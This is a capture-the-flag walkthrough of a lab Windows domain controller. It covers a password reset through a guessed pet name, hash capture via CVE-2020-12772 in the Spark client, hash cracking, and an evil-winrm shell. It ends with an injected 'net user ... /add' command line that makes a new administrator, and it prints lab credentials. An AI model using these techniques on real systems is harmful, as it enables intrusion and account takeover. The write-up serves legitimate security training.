# ra

## nmap

PORT      STATE SERVICE             VERSION                                                                                                                           
53/tcp    open  domain?                                                                                                                                               
80/tcp    open  http                Microsoft IIS httpd 10.0                                                                                                          
88/tcp    open  kerberos-sec        Microsoft Windows Kerberos (server time: 2020-08-10 07:59:02Z)                                                                    
135/tcp   open  msrpc               Microsoft Windows RPC                                                                                                             
139/tcp   open  netbios-ssn         Microsoft Windows netbios-ssn                                                                                                     
389/tcp   open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)                                   
443/tcp   open  ssl/http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                           
445/tcp   open  microsoft-ds?                                                                                                                                         
464/tcp   open  kpasswd5?                                                                                                                                             
593/tcp   open  ncacn_http          Microsoft Windows RPC over HTTP 1.0                                                                                               
636/tcp   open  ldapssl?                                                                                                                                              
2179/tcp  open  vmrdp?                                                                                                                                                
3268/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)                                   
3269/tcp  open  globalcatLDAPssl?                                                                                                                                     
3389/tcp  open  ms-wbt-server       Microsoft Terminal Services                                                                                                       
5222/tcp  open  jabber                                                                                                                                                
5223/tcp  open  ssl/hpvirtgrp?                                                                                                                                        
5229/tcp  open  jaxflow?                                                                                                                                              
5262/tcp  open  jabber                                                                                                                                                
5263/tcp  open  ssl/unknown                                                                                                                                           
5269/tcp  open  xmpp                Wildfire XMPP Client                                                                                                              
5270/tcp  open  ssl/xmp?                 
5275/tcp  open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later                                                                            
5276/tcp  open  ssl/unknown              
5985/tcp  open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                           
7070/tcp  open  http                Jetty 9.4.18.v20190429                         
7443/tcp  open  ssl/http            Jetty 9.4.18.v20190429                         
7777/tcp  open  socks5              (No authentication; connection failed)                                                                                            
9090/tcp  open  zeus-admin?              
9091/tcp  open  ssl/xmltec-xmlmail?                                                
9389/tcp  open  mc-nmf              .NET Message Framing                           
49669/tcp open  msrpc               Microsoft Windows RPC                          
49674/tcp open  ncacn_http          Microsoft Windows RPC over HTTP 1.0                                                                                               
49675/tcp open  msrpc               Microsoft Windows RPC                          
49676/tcp open  msrpc               Microsoft Windows RPC                          
49745/tcp open  msrpc               Microsoft Windows RPC  

## httpenum



on enumerating site we see a reset password option

![image-20200810133719555](ra.assets/image-20200810133719555.png)

one of your favourite pets name is also a question



we see a person with her dog maybe we can reset her password.

1. we need her username
2. we need dogs name

![image-20200810133852694](ra.assets/image-20200810133852694.png)



upon further viewing image in new tab we see image name as lilyle and sparky

1. username: lilyle
2. petsname: sparky

![image-20200810134005041](ra.assets/image-20200810134005041.png)



got new password for lilyle

![image-20200810135343356](ra.assets/image-20200810135343356.png)

### creds

lilyle	:	ChangeMe#1234

## smb

### verification

![image-20200810140234324](ra.assets/image-20200810140234324.png)

there is green color plus sign means we can log into smb but cannot execute remote sessions

### smbclient

![image-20200810142807207](ra.assets/image-20200810142807207.png)

intersting share is **shared**

lets enumerate the share

![image-20200810150902402](ra.assets/image-20200810150902402.png)

- found 1st flag 
- spark applications its a client messaging application

![image-20200810151639565](ra.assets/image-20200810151639565.png)

<u>important</u> in case of time_out_error put timeout option to 3600 so that we can download file

## spark

![image-20200810151927175](ra.assets/image-20200810151927175.png)

- installed spark client
- logged in with lilyle credentials

### vulnerability

CVE-2020-12772

![image-20200810152230439](ra.assets/image-20200810152230439.png)

[GITHUB](https://github.com/theart42/cves/blob/master/cve-2020-12772/CVE-2020-12772.md)

### info

- this vulnerability allows us to get hashes of users 
- when they click on the link where responder is running

### ntlmv2

![image-20200810152940971](ra.assets/image-20200810152940971.png)

got a ntlmv2 hash lets crack it to see what could be the password



## hashcat

![image-20200810153243023](ra.assets/image-20200810153243023.png)



### creds

buse : uzunLM+3131



## evil-winrm

![image-20200810153653109](ra.assets/image-20200810153653109.png)

credentials are valid 



lets try to login with evil-winrm

![image-20200810153748982](ra.assets/image-20200810153748982.png)

we got a shell on the box



### enumeration

![image-20200810154027020](ra.assets/image-20200810154027020.png)

on enumerating we found out we are part of account operators group

- we have ability to change passwords.
- only of non-administrative user

### scripts

found a scripts folder on root directory

![image-20200810154240323](ra.assets/image-20200810154240323.png)





the script is taking the contents of hosts.txt from brittanycr and executing it.

![image-20200810154426258](ra.assets/image-20200810154426258.png)



### creds

we can use our privilege of account operators group to change the password of brittanycr on this domain

```powershell
net user brittanycr Password1234! /domain
```

![image-20200810155707751](ra.assets/image-20200810155707751.png)

brittanycr	:	Password1234!





## post

we cannot get remote shell maybe brittanycr is not part of remote management group

![image-20200810160120286](ra.assets/image-20200810160120286.png)



but we can get into smb lets change hosts.txt content to add us as new user in administrator group



### smbclient

````powershell
; net user manish Password; net localgroup administrators manish /add
````



![image-20200810160556089](ra.assets/image-20200810160556089.png)



now we are admins

![image-20200810160920672](ra.assets/image-20200810160920672.png)



![image-20200810161023317](ra.assets/image-20200810161023317.png)